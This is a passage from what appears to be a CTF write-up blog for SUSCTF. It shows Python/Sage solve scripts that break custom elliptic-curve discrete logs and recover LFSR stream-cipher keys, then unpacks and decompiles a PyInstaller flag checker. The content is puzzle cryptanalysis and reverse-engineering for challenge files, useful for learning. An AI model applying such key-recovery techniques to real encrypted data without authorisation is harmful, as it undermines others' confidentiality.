language_">self</span>.b)*inverse(<span class="number">2</span>*y1, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = (y2-y1)*inverse(x2-x1, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.p</span><br><span class="line">        x3 = <span class="variable language_">self</span>.b*inverse(<span class="variable language_">self</span>.a-t**<span class="number">2</span>, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.p</span><br><span class="line">        y3 = x3*t % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> SpecialCurvePoint(<span class="variable language_">self</span>.p, <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, k</span>):</span><br><span class="line">        <span class="keyword">assert</span> k &gt;= <span class="number">0</span></span><br><span class="line">        Q = SpecialCurvePoint(<span class="variable language_">self</span>.p, <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        P = SpecialCurvePoint(<span class="variable language_">self</span>.p, <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        now = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> k % <span class="number">2</span>:</span><br><span class="line">                k -= <span class="number">1</span></span><br><span class="line">                Q = P + Q</span><br><span class="line">                cnt += now</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                k //= <span class="number">2</span></span><br><span class="line">                P = P + P</span><br><span class="line">                now *= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.p + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_zero</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.x == <span class="number">0</span> <span class="keyword">and</span> <span class="variable language_">self</span>.other == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.a == other.a <span class="keyword">and</span> <span class="variable language_">self</span>.b == other.b <span class="keyword">and</span> <span class="variable language_">self</span>.p == other.p \</span><br><span class="line">            <span class="keyword">and</span> <span class="variable language_">self</span>.x == other.x <span class="keyword">and</span> <span class="variable language_">self</span>.y == other.y</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(md5((<span class="string">&quot;%d-%d-%d-%d-%d&quot;</span> % (<span class="variable language_">self</span>.p, <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)).encode()).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert</span>(<span class="params">P</span>):</span><br><span class="line">    <span class="keyword">return</span> SpecialCurvePoint(P.p, P.a, P.b, P.x, -P.y % P.p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P1, P2</span>):</span><br><span class="line">    <span class="keyword">return</span> P1 + P2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">problem3</span>():</span><br><span class="line">    curve=SpecialCurve(<span class="number">52373730653143623993722188411805072409768054271090317191163373082830382186155222057388907031638565243831629283127812681929449631957644692314271061305360051</span>,<span class="number">28655236915186704327844312279364325861102737672471191366040478446302230316126579253163690638394777612892597409996413924040027276002261574013341150279408716</span>,<span class="number">42416029226399083779760024372262489355327595236815424404537477696856946194575702884812426801334149232783155054432357826688204061261064100317825443760789993</span>)</span><br><span class="line">    G=curve(<span class="number">15928930551986151950313548861530582114536854007449249930339281771205424453985946290830967245733880747219865184207937142979512907006835750179101295088805979</span>, <span class="number">29726385672383966862722624018664799344530038744596171136235079529609085682764414035677068447708040589338778102975312549905710028842378574272316925268724240</span>)</span><br><span class="line">    Q=curve(<span class="number">38121552296651560305666865284721153617113944344833289618523344614838728589487183141203437711082603199613749216407692351802119887009907921660398772094998382</span>, <span class="number">26933444836972639216676645467487306576059428042654421228626400416790420281717654664520663525738892984862698457685902674487454159311739553538883303065780163</span>)</span><br><span class="line">    p = <span class="number">52373730653143623993722188411805072409768054271090317191163373082830382186155222057388907031638565243831629283127812681929449631957644692314271061305360051</span></span><br><span class="line">    E = curve(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    order = p + <span class="number">1</span></span><br><span class="line">    factors = [<span class="number">4</span>, <span class="number">2663</span>, <span class="number">5039</span>, <span class="number">14759</span>, <span class="number">18803</span>, <span class="number">21803</span>, <span class="number">22271</span>, <span class="number">22307</span>, <span class="number">23879</span>, <span class="number">26699</span>, <span class="number">35923</span>, <span class="number">42727</span>, <span class="number">48989</span>, <span class="number">52697</span>, <span class="number">57773</span>, <span class="number">58129</span>, <span class="number">60527</span>, <span class="number">66877</span>, <span class="number">69739</span>, <span class="number">74363</span>, <span class="number">75869</span>, <span class="number">79579</span>, <span class="number">80489</span>, <span class="number">81043</span>, <span class="number">81049</span>, <span class="number">82531</span>, <span class="number">84509</span>, <span class="number">85009</span>, <span class="number">91571</span>, <span class="number">96739</span>, <span class="number">98711</span>, <span class="number">102481</span>, <span class="number">103357</span>, <span class="number">103981</span>]</span><br><span class="line">    ans = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> factors:</span><br><span class="line">        this = bsgs(G * (order // factor), Q * (order // factor), (<span class="number">0</span>, factor), operation=<span class="string">&#x27;other&#x27;</span>, op=add, inverse=invert, identity=E)</span><br><span class="line">        ans.append(this)</span><br><span class="line">        <span class="built_in">print</span>(this)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> crt(ans, factors)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">problem2</span>():</span><br><span class="line">    y1 = <span class="number">96989919722797171541882834089135074413922451043302800296198062675754293402989</span></span><br><span class="line">    yn = <span class="number">110661224324697604640962229701359894201176516005657224773855350780007949687952</span></span><br><span class="line">    p = <span class="number">191068609532021291665270648892101370598912795286064024735411416824693692132923</span></span><br><span class="line">    <span class="keyword">return</span> yn * inverse(y1, p) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">problem1</span>():</span><br><span class="line"></span><br><span class="line">    p = <span class="number">233083587295210134948821000868826832947</span></span><br><span class="line">    a = <span class="number">73126617271517175643081276880688551524</span></span><br><span class="line">    b = <span class="number">88798574825442191055315385745016140538</span></span><br><span class="line">    D = (Mod(a, p)^-<span class="number">1</span>).nth_root(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Map</span>(<span class="params">P</span>):</span><br><span class="line">        x, y = P.x, P.y</span><br><span class="line">        <span class="keyword">return</span> Mod((x - b * inverse_mod(<span class="number">2</span> * a, p) + D * y) * <span class="number">2</span> * a * inverse_mod(b, p), p)</span><br><span class="line"></span><br><span class="line">    curve=SpecialCurve(<span class="number">233083587295210134948821000868826832947</span>,<span class="number">73126617271517175643081276880688551524</span>,<span class="number">88798574825442191055315385745016140538</span>)</span><br><span class="line">    G=curve(<span class="number">183831340067417420551177442269962013567</span>, <span class="number">99817328357051895244693615825466756115</span>)</span><br><span class="line">    Q=curve(<span class="number">166671516040968894138381957537903638362</span>, <span class="number">111895361471674668502480740000666908829</span>)</span><br><span class="line"></span><br><span class="line">    g = Map(G)</span><br><span class="line">    q = -Map(Q)</span><br><span class="line">    factors = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">71</span>, <span class="number">2671</span>, <span class="number">20147</span>, <span class="number">69341</span>, <span class="number">146631649272726436705613</span>]</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> factors[:-<span class="number">1</span>]:</span><br><span class="line">        this = bsgs(g ** (order // factor), q ** (order // factor), (<span class="number">0</span>, factor))</span><br><span class="line">        ans.append(this)</span><br><span class="line">        <span class="built_in">print</span>(this)</span><br><span class="line">    ans.append(<span class="number">71440828573593354113865</span>)</span><br><span class="line">    <span class="keyword">return</span> crt(ans, factors)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">e1 = problem1()</span><br><span class="line">e2 = problem2()</span><br><span class="line">e3 = problem3()</span><br><span class="line">enc = <span class="number">4161358072766336252252471282975567407131586510079023869994510082082055094259455767245295677764252219353961906640516887754903722158044643700643524839069337</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(bytes_to_long(hashlib.sha512(<span class="string">b&#x27;%d-%d-%d&#x27;</span>%(e1,e2,e3)).digest()) ^^ enc))</span><br></pre></td></tr></table></figure>

<h2><span id="ez-pager-tiper">Ez_Pager_Tiper</span><a href="#ez-pager-tiper" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> magic_box <span class="keyword">import</span> lfsr, generator</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gauss</span>(<span class="params">mat</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat[<span class="number">0</span>]) - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> mat[i][i] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(mat)):</span><br><span class="line">                <span class="keyword">if</span> mat[j][i] != <span class="number">0</span>:</span><br><span class="line">                    mat[i], mat[j] = mat[j], mat[i]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line">            <span class="keyword">if</span> i == j <span class="keyword">or</span> mat[j][i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(mat[i])):</span><br><span class="line">                mat[j][k] ^= mat[i][k]</span><br><span class="line">    <span class="keyword">return</span> mat</span><br><span class="line"></span><br><span class="line">n1, n2 = <span class="number">64</span>, <span class="number">12</span></span><br><span class="line">plain_2 = <span class="string">b&#x27;Date: 1984-04-01&#x27;</span></span><br><span class="line">cip_2 = <span class="built_in">open</span>(<span class="string">&#x27;MTk4NC0wNC0wMQ==_6d30.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">bit_list = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain_2)):</span><br><span class="line">    bit_list += <span class="built_in">bin</span>(plain_2[i] ^ cip_2[i])[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">mat = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bit_list) - n2 - <span class="number">1</span>):</span><br><span class="line">    rol = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n2 + <span class="number">1</span>):</span><br><span class="line">        rol.append(<span class="built_in">int</span>(bit_list[i + j]))</span><br><span class="line">    mat.append(rol)</span><br><span class="line">mat = gauss(mat)</span><br><span class="line">mask2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n2):</span><br><span class="line">    mask2 = mask2 * <span class="number">2</span> + mat[i][-<span class="number">1</span>]</span><br><span class="line">mask_list = <span class="built_in">bin</span>(mask2)[<span class="number">2</span>:].zfill(n2)</span><br><span class="line">seed_list = bit_list[:n2]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n2):</span><br><span class="line">    res = <span class="built_in">int</span>(seed_list[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n2 - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(mask_list[j + <span class="number">1</span>]):</span><br><span class="line">            res ^= <span class="built_in">int</span>(seed_list[j])</span><br><span class="line">    seed_list = <span class="built_in">str</span>(res) + seed_list[:-<span class="number">1</span>]</span><br><span class="line">seed2 = <span class="built_in">int</span>(seed_list, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(seed2, mask2)</span><br><span class="line"></span><br><span class="line">plain_1 = <span class="string">b&#x27;Date: 1984-12-25\r\n&#x27;</span></span><br><span class="line">cip_1 = <span class="built_in">open</span>(<span class="string">&#x27;MTk4NC0xMi0yNQ==_76ff.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">bit_list_base = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain_1)):</span><br><span class="line">    bit_list_base += <span class="built_in">bin</span>(plain_1[i] ^ cip_1[i])[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seed3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">12</span>):</span><br><span class="line">    lfit = lfsr(seed3, mask2, n2)</span><br><span class="line">    bit_list_mask = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bit_list_base:</span><br><span class="line">        bit_list_mask += <span class="built_in">str</span>(lfit.getrandbit(<span class="number">1</span>))</span><br><span class="line">    bit_list = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bit_list_base)):</span><br><span class="line">        bit_list += <span class="built_in">str</span>(<span class="built_in">int</span>(bit_list_base[i]) ^ <span class="built_in">int</span>(bit_list_mask[i]))</span><br><span class="line"></span><br><span class="line">    mat = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bit_list) - n1 - <span class="number">1</span>):</span><br><span class="line">        rol = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n1 + <span class="number">1</span>):</span><br><span class="line">            rol.append(<span class="built_in">int</span>(bit_list[i + j]))</span><br><span class="line">        mat.append(rol)</span><br><span class="line">    mat = gauss(mat)</span><br><span class="line">    mask1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n1):</span><br><span class="line">        mask1 = mask1 * <span class="number">2</span> + mat[i][-<span class="number">1</span>]</span><br><span class="line">    seed_list = bit_list[:n1]</span><br><span class="line">    mask_list = <span class="built_in">bin</span>(mask1)[<span class="number">2</span>:].zfill(n1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n1):</span><br><span class="line">        res = <span class="built_in">int</span>(seed_list[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n1 - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(mask_list[j + <span class="number">1</span>]):</span><br><span class="line">                res ^= <span class="built_in">int</span>(seed_list[j])</span><br><span class="line">        seed_list = <span class="built_in">str</span>(res) + seed_list[:-<span class="number">1</span>]</span><br><span class="line">    seed1 = <span class="built_in">int</span>(seed_list, <span class="number">2</span>)</span><br><span class="line">    magic = <span class="number">15193544052573546419</span></span><br><span class="line">    lfsr1=lfsr(seed1, mask1, n1)</span><br><span class="line">    lfsr2=lfsr(seed3, mask2, n2)</span><br><span class="line">    cipher = generator(lfsr1, lfsr2, magic)</span><br><span class="line">    plain = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cip_1:</span><br><span class="line">        tmp = (x ^ cipher.getrandbit(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> tmp &gt; <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        plain = (plain &lt;&lt; <span class="number">8</span>) + tmp</span><br><span class="line">    plain = long_to_bytes(plain)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;SUSCTF&#x27;</span> <span class="keyword">in</span> plain:</span><br><span class="line">        <span class="built_in">print</span>(plain)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<h1><span id="rev">Rev</span><a href="#rev" class="header-anchor"></a></h1><h2><span id="digitalcircuits">DigitalCircuits</span><a href="#digitalcircuits" class="header-anchor"></a></h2><p>题目目测用Python 生成的exe，首先用pyinstxtractor.py 解包exe<br>python pyinstxtractor.py DigitalCircuits.exe<br>之后对比 struct 与 DigitalCircuits 2个文件的16进制码<br><img src="./20220301005626629.jpg" alt="img"><br><img src="./20220301005626083.jpg" alt="img"><br>复制插入16进制码 修复Python版本和时间戳之后 将DigitalCircuits后缀改为.pyc<br>用python在线反编译出py代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> b == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> b == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f3</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">None</span> == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f4</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> f2(f1(a, f3(b)), f1(f3(a), b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f5</span>(<span class="params">x, y, z</span>):</span><br><span class="line">    s = f4(f4(x, y), z)</span><br><span class="line">    c = f2(f1(x, y), f1(z, f2(x, y)))</span><br><span class="line">    <span class="keyword">return</span> (s, c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f6</span>(<span class="params">a, b</span>):</span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    z = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    a = a[::-<span class="number">1</span>]</span><br><span class="line">    b = b[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        ans += f5(a[i], b[i], z)[<span class="number">0</span>]</span><br><span class="line">        z = f5(a[i], b[i], z)[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f7</span>(<span class="params">a, n</span>):</span><br><span class="line">    <span class="keyword">return</span> a[n:] + <span class="string">&#x27;0&#x27;</span> * n</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f8</span>(<span class="params">a, n</span>):</span><br><span class="line">    <span class="keyword">return</span> n * <span class="string">&#x27;0&#x27;</span> + a[:-n]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f9</span>(<span class="params">a, b</span>):</span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        ans += f4(a[i], b[i])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f10</span>(<span class="params">v0, v1, k0, k1, k2, k3</span>):</span><br><span class="line">    s = <span class="string">&#x27;00000000000000000000000000000000&#x27;</span></span><br><span class="line">    d = <span class="string">&#x27;10011110001101110111100110111001&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        s = f6(s, d)</span><br><span class="line">        v0 = f6(v0, f9(f9(f6(f7(v1, <span class="number">4</span>), k0), f6(v1, s)), f6(f8(v1, <span class="number">5</span>), k1)))</span><br><span class="line">        v1 = f6(v1, f9(f9(f6(f7(v0, <span class="number">4</span>), k2), f6(v0, s)), f6(f8(v0, <span class="number">5</span>), k3)))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> v0 + v1</span><br><span class="line"></span><br><span class="line">k0 = <span class="string">&#x27;0100010001000101&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k1 = <span class="string">&#x27;0100000101000100&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k2 = <span class="string">&#x27;0100001001000101&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k3 = <span class="string">&#x27;0100010101000110&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;please input flag:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">0</span>:<span class="number">7</span>] != <span class="string">&#x27;SUSCTF&#123;&#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] != <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error!!!The formate of flag is SUSCTF&#123;XXX&#125;&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">flagstr = flag[<span class="number">7</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flagstr) != <span class="number">24</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error!!!The length of flag 24&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flagstr), <span class="number">8</span>):</span><br><span class="line">    v0 = flagstr[i:i + <span class="number">4</span>]</span><br><span class="line">    v0 = <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i + <span class="number">1</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i + <span class="number">2</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i + <span class="number">3</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    v1 = <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i + <span class="number">4</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i + <span class="number">5</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i + <span class="number">6</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i + <span class="number">7</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    res += f10(v0, v1, k0, k1, k2, k3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> res == <span class="string">&#x27;001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;False&#x27;</span>)</span><br><span 